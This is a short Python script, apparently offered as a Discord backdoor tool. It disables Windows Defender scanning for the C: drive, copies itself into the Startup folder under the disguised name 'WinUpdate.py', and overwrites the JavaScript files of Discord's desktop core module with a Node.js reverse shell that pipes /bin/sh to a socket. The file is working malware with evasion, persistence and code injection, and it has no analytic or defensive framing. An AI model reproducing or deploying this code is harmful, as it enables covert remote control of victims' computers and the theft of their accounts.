import os
import subprocess
import shutil
from pathlib import Path

user = str(os.environ["USERNAME"])
persistance = False
alreadyBackdoored = False
injected = False 

def backdoor(filename):
    payload = """module.exports = require('./core.asar');
(function(){
var net = require("net"),
    cp = require("child_process"),
    sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(4242, "127.0.0.1", function(){
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();"""
    with open(filename, 'rb') as file:
        content = file.read()
        if content == payload:
            injected = True
    try:
        with open(filename, 'w') as file2:
            file2.write(payload)
            injected = True
    except:
        injected = False

def disableAvAndPersistance():
    os.system('powershell -Command Add-MpPreference -ExclusionPath "C:"')
    if os.path.isfile("C:\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WinUpdate.py"):
        print("already backdoored")
        exit()
    else:
        try:
            shutil.copy(__file__, "C:\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WinUpdate.py")
            persistance = True
        except:
            persistance = False


def main():
    disableAvAndPersistance()
    path = "C:\\Users\\nullb\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_desktop_core\\"
    my_path = Path(path)
    for file in my_path.glob("**/*.js"):
        backdoor(file)
    if injected == False:
        print("could not inject payload")
        exit()
main()
